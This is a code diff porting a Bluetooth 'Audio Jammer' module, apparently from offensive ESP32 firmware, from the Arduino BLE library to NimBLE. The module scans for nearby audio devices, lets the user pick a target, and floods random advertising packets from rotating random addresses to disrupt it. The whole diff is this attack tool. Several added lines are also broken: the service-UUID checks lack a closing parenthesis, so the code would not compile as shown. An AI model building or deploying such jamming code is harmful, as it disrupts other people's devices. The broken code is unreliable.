@@ -1,13 +1,9 @@
 #include "arsenal.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
-#include <BLEAdvertising.h>
-#include <BLEDevice.h>
-#include <BLEScan.h>
+#include <NimBLEDevice.h>
 #include <globals.h>
 
-
-extern "C" int ble_hs_id_set_rnd(const uint8_t *rnd_addr);
 
 struct AudioDevice {
     String address;
@@ -18,15 +14,15 @@ struct AudioDevice {
 static std::vector<AudioDevice> audioDevices;
 
 
-static bool isAudioDevice(BLEAdvertisedDevice &dev) {
+static bool isAudioDevice(NimBLEAdvertisedDevice &dev) {
 
     if (dev.haveServiceUUID()) {
 
-        if (dev.isAdvertisingService(BLEUUID("0000110b-0000-1000-8000-00805f9b34fb"))) return true;
+        if (dev.isAdvertisingService(NimBLEUUID("0000110b-0000-1000-8000-00805f9b34fb")) return true;
 
-        if (dev.isAdvertisingService(BLEUUID("0000111e-0000-1000-8000-00805f9b34fb"))) return true;
+        if (dev.isAdvertisingService(NimBLEUUID("0000111e-0000-1000-8000-00805f9b34fb")) return true;
 
-        if (dev.isAdvertisingService(BLEUUID("0000110a-0000-1000-8000-00805f9b34fb"))) return true;
+        if (dev.isAdvertisingService(NimBLEUUID("0000110a-0000-1000-8000-00805f9b34fb")) return true;
     }
 
 
@@ -44,10 +40,10 @@ static bool isAudioDevice(BLEAdvertisedDevice &dev) {
     return false;
 }
 
-class AudioScanCallbacks : public BLEAdvertisedDeviceCallbacks {
-    void onResult(BLEAdvertisedDevice advertisedDevice) override {
-        if (isAudioDevice(advertisedDevice)) {
-            String addr = advertisedDevice.getAddress().toString().c_str();
+class AudioScanCallbacks : public NimBLEScanCallbacks {
+    void onResult(NimBLEAdvertisedDevice *advertisedDevice) override {
+        if (isAudioDevice(*advertisedDevice)) {
+            String addr = advertisedDevice->getAddress().toString().c_str();
 
             for (auto &d : audioDevices) {
                 if (d.address == addr) return;
@@ -55,9 +51,9 @@ class AudioScanCallbacks : public BLEAdvertisedDeviceCallbacks {
             if (audioDevices.size() < 20) {
                 AudioDevice dev;
                 dev.address = addr;
-                dev.name = advertisedDevice.haveName() ?
-                           advertisedDevice.getName().c_str() : "Unknown Audio";
-                dev.rssi = advertisedDevice.getRSSI();
+                dev.name = advertisedDevice->haveName() ?
+                           advertisedDevice->getName().c_str() : "Unknown Audio";
+                dev.rssi = advertisedDevice->getRSSI();
                 audioDevices.push_back(dev);
             }
         }
@@ -66,7 +62,7 @@ class AudioScanCallbacks : public BLEAdvertisedDeviceCallbacks {
 
 
 static void jamAudioTarget(String targetAddr) {
-    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
+    NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
     int jamPackets = 0;
     unsigned long startTime = millis();
 
@@ -74,10 +70,10 @@ static void jamAudioTarget(String targetAddr) {
 
 
         for (int burst = 0; burst < 10; burst++) {
-            BLEAdvertisementData advData;
+            NimBLEAdvertisementData advData;
 
 
-            String payload = "";
+            std::string payload;
             for (int i = 0; i < 20; i++) {
                 payload += (char)random(256);
             }
@@ -88,7 +84,10 @@ static void jamAudioTarget(String targetAddr) {
             uint8_t addr[6];
             for (int i = 0; i < 6; i++) addr[i] = random(256);
             addr[0] |= 0xC0;
-            ble_hs_id_set_rnd(addr);
+            NimBLEDevice::setSecurityAuth(false, false, false);
+            NimBLEAddress addrObj;
+            addrObj = NimBLEAddress(addr, BLE_ADDR_RANDOM);
+            esp_ble_gap_set_rand_addr(addrObj.getNative());
 
             pAdvertising->setAdvertisementData(advData);
             pAdvertising->start();
@@ -127,7 +126,7 @@ static void jamAudioTarget(String targetAddr) {
             tft.printf("Rate: ~%d pkt/s", jamPackets / max(1UL, elapsed));
 
             tft.setTextColor(TFT_RED, bruceConfig.bgColor);
-            tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 20, 1);
+            tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 20, 1);
         }
 
         if (check(EscPress)) break;
@@ -140,9 +139,10 @@ void arsenal_bt_audio_jammer(void) {
     ARSENAL_SAFE_RUN([]() {
         audioDevices.clear();
 
-        BLEDevice::init("");
-        BLEScan *pScan = BLEDevice::getScan();
-        pScan->setAdvertisedDeviceCallbacks(new AudioScanCallbacks(), true);
+        NimBLEDevice::deinit(true);
+        NimBLEDevice::init("");
+        NimBLEScan *pScan = NimBLEDevice::getScan();
+        pScan->setScanCallbacks(new AudioScanCallbacks());
         pScan->setActiveScan(true);
         pScan->setInterval(100);
         pScan->setWindow(99);
@@ -151,7 +151,7 @@ void arsenal_bt_audio_jammer(void) {
         drawMainBorderWithTitle("Audio Jammer");
         tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
         tft.setTextSize(FP);
-        tft.drawCentreString("Scanning for audio devices...", tftWidth / 2, tftHeight / 2, 1);
+        tft.drawCentreString(String("Scanning for audio devices..."), tftWidth / 2, tftHeight / 2, 1);
 
         pScan->start(5, false);
         pScan->stop();
@@ -182,6 +182,6 @@ void arsenal_bt_audio_jammer(void) {
             loopOptions(options, MENU_TYPE_SUBMENU, "Select Target");
         }
 
-        BLEDevice::deinit(false);
+        NimBLEDevice::deinit(true);
     });
 }
